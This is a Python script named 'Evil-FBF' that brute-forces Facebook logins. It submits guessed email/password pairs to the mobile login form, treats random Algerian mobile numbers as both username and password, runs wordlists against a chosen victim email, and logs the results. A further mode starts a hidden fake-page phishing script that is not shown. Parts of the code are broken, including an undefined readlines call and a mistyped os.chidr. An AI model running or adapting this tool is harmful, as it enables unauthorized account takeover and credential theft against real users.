import os,sys,requests,time,random,mechanicalsoup,zlib
from colorama import Fore,Style
C =O= Fore.CYAN
W = Fore.WHITE
B = Fore.BLUE
R = Fore.RED
G = Fore.GREEN
bi = """
				    ███████████████████████
			            █Y O U  A R E  F R E E█
			            ███████████████████████

"""
os.system("clear")
print("                 	    ███████████████████████")
time.sleep(0.3)

print("                 	    █Y O U  A R E  F R E E█")
time.sleep(0.3)

print("                 	    ███████████████████████")
time.sleep(.8)
class BruteIT():
    def help(self):
        script_name = sys.argv[0]
        print("""
{}  [--Arg1=value --Arg2=value2 ...]
Evil-FBF Coded By The {}Evil-Demon {}[Zarkis].

              --mode
            
                --mode=1 For Random BruteForce Mode .
                --mode=2 For Normal BruteForce Mode .

                --file=.txt   type password list.
                --email=@.com type email victim.
               
                --mode=3 For Scaming Mode [Fake Pages].
            
              --help  Show this Window.

""".format(script_name,R,W))



    def banner(self):
        banner = ("""
{}{}
			╔═╗┬  ┬┬┬         ╔╦╗┌─┐┌┬┐┌─┐┌┐┌
			║╣ └┐┌┘││    ───   ║║├┤ ││││ ││││
			╚═╝ └┘ ┴┴─┘       ═╩╝└─┘┴ ┴└─┘┘└┘
			{}─────────────────────────────────{}
		        I JUST WANT BE THE GREATEST DEMON{}
			─────────────────────────────────{}
 		       ___                             ___
		      (o o)                           (o o)
		     (  V  ) Evil Facebook Framework (  V  )
                     --m-m-----------------------------m-m--
""".format(Style.BRIGHT,C,W,Fore.RED,W,W))
        banner1 = """
        """
        banner2 = """
        """
        sik  = [banner,banner1,banner2]
        return [banner,banner1,banner2]
    def random_num(self,mode):
        if mode == 1:
            sip  = random.randint(550000000,600000000)
        elif mode == 2:
            sip  = random.randint(770000000,800000000)
        return "0"+str(sip);
    def getlist(self,file):
        try:
            with open(file,"r") as ef:
                ef = readlines()
        except FileNotFoundError:
            print("{}[-] {}File {} Not Found.".format(R,W,file))
            exit()
        return ef;
    def browsing(self,email,pawd):
        try:
            os.mkdir("logs")
        except :
            pass
            
        osd = open("logs/log.txt","a")
        br = mechanicalsoup.StatefulBrowser()
        br.open("https://mbasic.facebook.com")
        br.select_form("#login_form")
        br['email'] = email
        br['pass'] = pawd
        br.submit_selected(btnName="login")
        url = br.get_url()
        print("[*] TRY {}{} {}{}{}.".format(C,email,B,pawd,W))
        if "save-device" in url:
            print("{}[+]{} WORKED PASSWORD/EMAIL -100%-!!".format(G,W))
        elif "checkpoint" in url:
            print("{}[*] {}Account Closed -75%-!!".format(B,W))
        else:
            print("{}[-] No Account -25%-[ to be sure check logs : logs/log.txt ]{}".format(R,W))
            osd.write("\n{}:{} \nURL : {}".format(email,pawd,url))
            osd.close()
    def random_brute(self):
        print(self.banner()[1])
        while True:
            print("""
                        [01]  OOREDOO
                        [02]  DJEZZY
                        [03]  CUSTOM
    """)
            random_mode = input("[*] Select : ")
            
            while True:
                try:
                    if random_mode =="1" or random_mode=="01":
                        email = pawd = self.random_num(1)
                    elif random_mode == "2" or random_mode=="02":
                        email = pawd = self.random_num(2)
                    elif random_mode == "3" :
                        start = input("From (0..) : ")
                        end = input("To (0..) : ")
                        email = pawd = "0"+str(random.randint(start,end))
                    else:
                        print("Dont mess With me okay ?")
                    self.browsing(email,pawd)
                except KeyboardInterrupt:
                    break;
                
                
                
            
    def selected_brute(self,filename,email):
        print(self.banner()[2])
        for pawd in self.getlist(filename):
            self.browsing(email,pawd)
        
        
    def main(self):
        try:
            mode = sys.argv[1]
            if mode == "--help" :
                self.help()
                exit()
        except IndexError:
            print(self.banner()[0])
            self.help()
            exit()
        simp = mode.replace("--mode=",'')
        if simp == "1":
            self.random_brute()
        elif simp == "2":
            try:
                
                sip = sys.argv[2]
                ip = sys.argv[3]
            except IndexError:
                print(self.banner()[0])

                self.help()
                exit()
    
            email = ip.replace("--email=","")
            filename = sip.replace("--file=","") 
            if email == "" or filename=="":
                self.help()
                exit()
            self.selected_brute(filename,email)
            
        elif simp == "3":
            os.chdir("core")
            os.system("python3 .freemain.py")
            os.chidr("..")

        else:
            self.help()
    
Big = BruteIT()
Big.main()
